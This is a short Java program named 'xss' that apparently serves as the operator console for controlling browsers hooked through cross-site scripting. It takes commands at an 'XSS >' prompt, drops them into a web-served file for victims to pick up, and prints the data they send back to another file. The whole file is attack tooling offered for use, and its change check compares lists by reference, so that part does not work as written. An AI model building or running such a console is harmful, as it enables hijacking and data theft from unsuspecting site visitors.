import java.io.IOException;
import java.io.Console;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public class xss {
	public static void main(String[] args) throws IOException, InterruptedException {
		Console std = System.console();
		String empty = "";
		List<String> postback_data;
		List<String> postback_data_save;
		while(true) {
		postback_data_save = Files.readAllLines(Paths.get("/var/www/html/postback.txt"));
		String command = std.readLine("XSS > ");
		Files.write(Paths.get("/var/www/html/event.txt"), command.getBytes());
		System.out.println("Executing...");
		Thread.sleep(7500);
		System.out.println("done");
		Files.write(Paths.get("/var/www/html/event.txt"), empty.getBytes());
		postback_data = Files.readAllLines(Paths.get("/var/www/html/postback.txt"));
		if(postback_data != postback_data_save){
			System.out.println("");
			System.out.print(postback_data);
			System.out.println("");
			postback_data_save = postback_data;
		}


		}
	}
}
